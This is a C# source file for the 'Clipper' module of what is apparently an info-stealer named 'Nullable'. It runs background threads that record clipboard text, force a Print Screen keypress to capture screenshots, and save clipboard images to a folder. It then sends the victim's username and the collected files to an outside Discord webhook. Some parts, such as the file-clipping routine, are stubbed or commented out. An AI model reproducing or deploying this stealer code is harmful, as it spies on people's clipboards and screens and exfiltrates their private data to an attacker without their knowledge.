using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Nullable.Modules.Stealer
{
    internal sealed class Clipper
    {
        public static void Run()
        {
            Directory.CreateDirectory(Config.ClipperPath);
            Thread Text = new Thread(ClipText) { IsBackground = true };
            Text.Start();

            Thread Files = new Thread(ClipFiles) { IsBackground = true };
            Files.Start();

            Thread Images = new Thread(ClipImages) { IsBackground = true };
            Images.Start();

            Modules.Network.Discord_Webhook.SendMessage("Incoming Clipper Log From: " + Environment.UserName);
            Modules.Network.Discord_Webhook.SendFileWebhook(Config.ClipperPath);
        }

        public static void ClipText()
        {
            /*
            while (true)
            {
                Text = Clipboard.GetText();
                if (Text != null)
                {
                    if(Text != PrevText)
                    {
                        File.AppendAllText(Config.ClipperPath + "\\Text(Clipboard).txt", DateTime.Now.ToLongTimeString() + ": " + Text);
                        PrevText = Text;
                        Thread.Sleep(2000);
                    }
                }
            }
            */
            int Times = Config.NumberOfClipboardTexts;
            string PrevText = "";
            string Text = "";

            for (int x = 0; x <= Times; x++)
            {
                Text = Clipboard.GetText();
                if (Text != null)
                {
                    if (Text != PrevText)
                    {
                        File.AppendAllText(Config.ClipperPath + "\\Text(Clipboard).txt", DateTime.Now.ToLongTimeString() + ": " + Text);
                        PrevText = Text;
                        Thread.Sleep(2000);
                    }
                }
            }
        }

        public static void ClipFiles()
        {
            Directory.CreateDirectory(Config.ClipperPath + "\\ClippedFiles");
            File.Create(Config.ClipperPath + "\\ClippedFiles\\X.txt");
            /*string FilePath = Config.ClipperPath + "\\ClippedFiles";
            int Times = Config.NumberOfClipboardFiles;

            for(int x = 0; x <= Times; x++)
            {
                byte[] PrevData;
                byte[] Data;

                Data = Clipboard.GetFileDropList();

                if (Data != null)
                {

                }
            */

        }

        public static void ClipImages()
        {
            int Times = Config.NumberOfClipboardImages;
            string Path = Config.ClipperPath + "\\ClippedImages";
            Directory.CreateDirectory(Path);

            SendKeys.Send("{PRTSC}");
            Image Rawr = Clipboard.GetImage();
            Image PrevImg = Rawr;

            Image Img;
            Thread.Sleep(10000);
            Img = Clipboard.GetImage();

            for (int x = 0; x<=Times; x++)
            {
                if (Img != null)
                {
                    if (Img != PrevImg)
                    {
                        Img.Save(Path + $"\\Image{x}");
                        PrevImg = Img;
                        Thread.Sleep(2000);
                    }
                }
            }
        }
    }
}
